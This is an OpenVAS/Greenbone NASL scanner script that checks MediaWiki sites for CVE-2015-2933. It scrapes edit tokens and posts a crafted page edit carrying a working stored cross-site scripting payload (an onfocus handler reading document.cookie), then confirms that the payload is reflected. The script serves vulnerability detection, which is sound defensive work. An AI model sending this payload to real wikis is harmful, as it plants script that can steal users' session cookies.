# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:mediawiki:mediawiki";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805387");
  script_version("2023-07-25T05:05:58+0000");
  script_cve_id("CVE-2015-2933");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2015-05-19 11:28:49 +0530 (Tue, 19 May 2015)");
  script_name("MediaWiki Language Variants Cross-site scripting Vulnerability");

  script_tag(name:"summary", value:"MediaWiki is prone to a cross-site scripting (XSS) vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP POST request
  and check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"The flaw exists because of language is set to
  a language with variants, then 'wpTextbox1' POST parameter to the 'index.php'
  script is not validated before returning it to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow
  remote attacker to execute arbitrary script code in a user's browser
  session within the trust relationship between their browser and the server.");

  script_tag(name:"affected", value:"Language variants for Mediawiki before 1.19.24,
  1.2x before 1.23.9, and 1.24.x before 1.24.2");

  script_tag(name:"solution", value:"Upgrade to Mediawiki 1.19.24, 1.23.9 or 1.24.2 or later.");

  script_tag(name:"qod_type", value:"remote_active");
  script_tag(name:"solution_type", value:"VendorFix");
  script_xref(name:"URL", value:"https://lists.wikimedia.org/pipermail/mediawiki-announce/2015-March/000175.html");
  script_xref(name:"URL", value:"https://phabricator.wikimedia.org/T73394");
  script_xref(name:"URL", value:"http://www.openwall.com/lists/oss-security/2015/04/07/3");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "secpod_mediawiki_detect.nasl");
  script_mandatory_keys("mediawiki/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

url = dir + "/index.php?title=%E9%A6%96%E9%A1%B5&action=edit";
reqwiki = http_get(item:url, port:port);
reswiki = http_keepalive_send_recv(port:port, data:reqwiki);

wplang = eregmatch(pattern:'lang="([a-zA-Z]*)" ', string:reswiki);
if(wplang[1] != 'zh'){
  exit(0);
}

wpStarttime = eregmatch(pattern:'value="([0-9]*)" name="wpStarttime"', string:reswiki);
if(!wpStarttime[1]){
   exit(0);
}

wpEdittime = eregmatch(pattern:'value="([0-9]*)" name="wpEdittime"', string:reswiki);
if(!wpEdittime[1]){
   exit(0);
}

wpAutoSummary = eregmatch(pattern:'value="([0-9a-zA-Z]*)" name="wpAutoSummary"', string:reswiki);
if(!wpAutoSummary[1]){
   exit(0);
}

oldid = eregmatch(pattern:'value="([0-9a-zA-Z]*)" name="oldid"', string:reswiki);
if(!oldid[1]){
   exit(0);
}

postData = string('-----------------------------7523421607973306651860038372\r\n',
                  'Content-Disposition: form-data; name="wpAntispam"\r\n\r\n\r\n',
                  '-----------------------------7523421607973306651860038372\r\n',
                  'Content-Disposition: form-data; name="wpSection"\r\n\r\n\r\n',
                  '-----------------------------7523421607973306651860038372\r\n',
                  'Content-Disposition: form-data; name="wpStarttime"\r\n\r\n',
                  wpStarttime[1],'\r\n',
                  '-----------------------------7523421607973306651860038372\r\n',
                  'Content-Disposition: form-data; name="wpEdittime"\r\n\r\n',
                  wpEdittime[1],'\r\n',
                  '-----------------------------7523421607973306651860038372\r\n',
                  'Content-Disposition: form-data; name="wpScrolltop"\r\n\r\n0\r\n',
                  '-----------------------------7523421607973306651860038372\r\n',
                  'Content-Disposition: form-data; name="wpAutoSummary"\r\n\r\n',
                  wpAutoSummary,'\r\n',
                  '-----------------------------7523421607973306651860038372\r\n',
                  'Content-Disposition: form-data; name="oldid"\r\n\r\n',oldid[1],'\r\n',
                  '-----------------------------7523421607973306651860038372\r\n',
                  'Content-Disposition: form-data; name="wpTextbox1"\r\n\r\n',
                  '-{H|abc123=>zh-cn:" autofocus onfocus="alert(document.cookie);}-\r\n',
                  '{{Special:Contributions|target=>abc123}}\r\n\r\n',
                  '-----------------------------7523421607973306651860038372\r\n',
                  'Content-Disposition: form-data; name="wpSummary"\r\n\r\n\r\n',
                  '-----------------------------7523421607973306651860038372\r\n',
                  'Content-Disposition: form-data; name="wpSave"\r\n\r\n',
                  'Save page\r\n',
                  '-----------------------------7523421607973306651860038372\r\n',
                  'Content-Disposition: form-data; name="wpEditToken"\r\n\r\n+\\\r\n',
                  '-----------------------------7523421607973306651860038372--\r\n');

host = http_host_name( port:port );

#Send Attack Request
sndReq = string("POST ", url, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "Content-Type: multipart/form-data;",
                "boundary=---------------------------7523421607973306651860038372\r\n",
                "Content-Length: ", strlen(postData), "\r\n\r\n",
                "\r\n", postData, "\r\n");
rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

url = dir + "/index.php/%E9%A6%96%E9%A1%B5";
sndReq = http_get(item:url, port:port);
rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

if( rcvRes =~ "^HTTP/1\.[01] 200" && "alert(document.cookie)" >< rcvRes ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
